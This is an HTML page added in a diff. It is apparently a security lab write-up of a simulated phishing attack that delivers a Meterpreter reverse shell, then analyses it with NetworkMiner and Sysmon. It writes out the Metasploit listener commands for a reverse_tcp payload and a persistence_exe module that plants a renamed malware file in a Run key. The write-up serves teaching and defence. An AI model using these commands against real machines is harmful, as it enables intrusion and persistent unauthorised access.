@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+
+<html lang="en">
+  
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
+  <style>* {font-family: Arial, Helvetica, sans-serif;}</style>
+  <title>Endpoint Security</title>
+</head>
+
+<body class="container-fluid">
+
+  <div class="row display-4 justify-content-center fw-bolder mb-5">Endpoint Security</div>
+
+  <div class="row fw-bold p-0 m-0 mb-3">Overview</div>
+  <div class="row m-0 p-0">
+    <p>
+      Phishing scenario demostrating reverse shell exploit with Meterpreter (Metasploit). 
+      Analysis of indicators of compromise (IOC) with NetworkMiner and Sysmon (Sysinternals).
+    </p>
+  </div>
+  
+  <div class="row fw-bold p-0 m-0 mb-3">Lab Environment</div>
+  <div class="row m-0 p-0 mb-1">
+    <ul>
+      <li>PT1: Kali Linux (Attack Host)</li>
+      <li>PC1 (Victim Host)</li>
+    </ul>
+  </div>
+
+  <div class="row fw-bold p-0 m-0 mb-3">Phishing Incident</div>
+  <div class="row m-0 p-0 mb-1">
+    <p>
+      An attack was simulated with a Meterpreter reverse shell from PT1.
+      This type of exploit is attempted on the chance that outbound filtering is not configured properly.
+      The phishing web page below was used to try to deliver the exploit.
+    </p>
+    <div class="row mb-5 flex justify-content-center"><img src="images/1.png" alt="1" class="col-lg-6"></div>    
+    <p>The following commands were written to the terminal to setup PT1 as a listener for the reverse shell.</p>
+    <code>msfconsole</code>    
+    <code>use exploit/multi/handler</code>
+    <code>set payload windows/meterpreter/reverse_tcp</code>
+    <code>set lhost 192.168.2.192</code>
+    <code>set lport 3389</code>
+    <code>exploit</code>
+    <div class="row mb-5 flex justify-content-center"><img src="images/2.png" alt="2" class="col-lg-6"></div>    
+    <p>Port 3389 is the standard port remote desktop protocol (RDP). Even if a outbound firewall was configured, default ports have a chance of not being changed.</p>    
+  </div>
+  
+  <div class="row fw-bold p-0 m-0 mb-3">Analyze Packets for Malware</div>
+  <div class="row m-0 p-0 mb-1">
+  <p>
+    The malware binary file was extracted with NetworkMiner for further analysis during the attack.
+    Before the delivery of the exploit, Windows Real Time Protection needed to be turned off on PT1 to ensure successful execution.
+  </p>
+  <div class="row mb-5 flex justify-content-center"><img src="images/3.png" alt="3" class="col-lg-6"></div>
+  <p>NetworkMiner was opened next, network adapter was set to WinPcap: Microsoft Corporation, then the program was started.</p>
+  <div class="row mb-5 justify-content-center"><img src="images/4.png" alt="4" class="col-lg-6"></div>
+  <p>To simulate a potential victim, the connection tool link was clicked and malware was delivered from the attack host phishing site.</p>
+  <div class="row mb-5 justify-content-center"><img src="images/5.png" alt="5" class="col-lg-6"></div>
+  <p>
+    After the secessful delivery, NetworkMiner can be stopped.
+    In the Files tab, the malware along side the website accessed can be seen.
+    Right clicking on the malware and selecting Calculate MD5 / SHA1 / SHA-256 hash will generate the hash, 
+    which can be compared to various blacklists. Keep in mind that malware code can be embedded in legitimate executables, making signature identification unlikely.
+  </p>
+  <div class="row mb-5 justify-content-center"><img src="images/6.png" alt="6" class="col-lg-6"></div>
+  </div>
+  
+<div class="row fw-bold p-0 m-0 mb-3">Configure Sysmon</div>
+  <div class="row m-0 p-0 mb-3">
+    <p>
+      A Sysmon configuration profile by InfoSec Swift on Security was used in Sysinternals to log the kill chain of the attack.
+      On PC1, the following command was used to install the Sysmon driver and configuration file on command prompt.
+    </p>
+    <code>C:\labfiles\sysinternals\sysmon.exe -i c:\labfiles\sysinternals\sysmonconfig-export.xml -n -accepteula</code>  
+    <div class="row mb-5 justify-content-center"><img src="images/7.png" alt="7" class="col-lg-6"></div>
+    <p>The User Name and Integrity Level columns were added in Process Explorer to assist in analysis after running the malware.</p>
+</div>
+
+<div class="row fw-bold p-0 m-0 mb-3">Identify Indicators of Compromise</div>
+  <div class="row m-0 p-0 mb-1">
+    <p>With Sysmon setup, the malware was then executed to then monitor with Sysinternals.</p>
+    <div class="row mb-5">
+      <img src="images/8.png" alt="8" class="col-lg-6 mb-3">
+      <img src="images/9.png" alt="9" class="col-lg-6 mb-3">
+    </div>
+    <p>If successful, there should be a meterpreter prompt in the PT1 terminal.</p>
+    <div class="row mb-5 justify-content-center"><img src="images/10.png" alt="10" class="col-lg-6"></div>    
+    <p>
+      The malware was executed from the browser, making it a child of the svchost container process. 
+      This means its privileges are limited to the logged on user.
+      The other columns describe the legitimate executable the malware is embedded in.
+    </p>
+    <div class="row mb-5 justify-content-center"><img src="images/11.png" alt="11" class="col-lg-6"></div> 
+    <p>
+      Processes run as an administrator have a high integrity level.
+      Processes with system privileges do not display any integrity level. 
+      Righclick the malware->Properties->TCP/IP tab. This will confirm the connected IP address of the attack host. 
+    </p>    
+    <div class="row mb-5 justify-content-center"><img src="images/12.png" alt="12" class="col-lg-4"></div>
+</div>
+
+<div class="row fw-bold p-0 m-0 mb-3">Analyze a Persistence Mechanism</div>
+  <div class="row m-0 p-0 mb-1">
+    <p>
+      Action on objective for this attack would likely involve maintaining persistence on the victim host.
+      On PT1 at the meterpreter prompt, the following commands initiated a persistence attempt.
+    </p>
+    <code>background</code>
+    <code>use post/windows/manage/persistence_exe</code>
+    <code>show options</code>
+    <code>set rexename svchost.exe</code>
+    <code>set rexepath /root/Downloads/evilputty.exe</code>
+    <code>set startup USER</code>
+    <code>set session 1</code>
+    <code>exploit</code> 
+    </code>
+    <div class="row mb-5 justify-content-center"><img src="images/13.png" alt="13" class="col-lg-6"></div>
+    <p>
+      With the persistence code executed, PC1 was restarted. 
+      This should kill the session on PT1. 
+      The following commands will reinitialize the reverse shell.
+    </p>
+    <code>back</code>
+    <code>use exploit/multi/handler</code>
+    <code>exploit</code>
+    </code>
+    <div class="row mb-5 justify-content-center"><img src="images/14.png" alt="14" class="col-lg-6"></div>
+    <p>
+      Logging back in on PC1, evilputty has run at startup. Execution was successful but too visible for effective action on objective.
+      Start Event Viewer->Expand Applications and Services Logs/Microsoft/Windows/Sysmon->Operational.
+    </p>
+    <div class="row mb-5 justify-content-center"><img src="images/15.png" alt="15" class="col-lg-6"></div>
+    <p>Looking through the logs, a timeline of the action on objective attempt can be determined.</p>
+    <ul>
+      <li>File created: evilputty.exe creates the svchost.exe file in the temp folder.</li>
+      <li>Process create: svchost.exe is loaded as a process.</li>
+      <li>Registry value set: The malware creates an entry in the Registry run key. Persistence in this case is limited to this user only.</li>
+      <li>Process terminated: The svchost.exe process exits.</li>
+    </ul>
+    <div class="row mb-5">
+      <img src="images/16.png" alt="16" class="col-lg-4 mb-1">   
+      <img src="images/17.png" alt="17" class="col-lg-4 mb-1">  
+      <img src="images/18.png" alt="18" class="col-lg-4 mb-1"> 
+    </div>    
+    <p>The svchost.exe file can be seen in the %temp% folder, evidence of an unsophisticated attempt at persistence.</p>
+    <div class="row mb-5 justify-content-center"><img src="images/19.png" alt="19" class="col-lg-6"></div>    
+    <p>In Sysinternals, the malware's autorun entry can be found and deleted.</p>
+    <div class="row mb-5 justify-content-center"><img src="images/20.png" alt="20" class="col-lg-6"></div>      
+  </div>
+</body>
+
+</html>
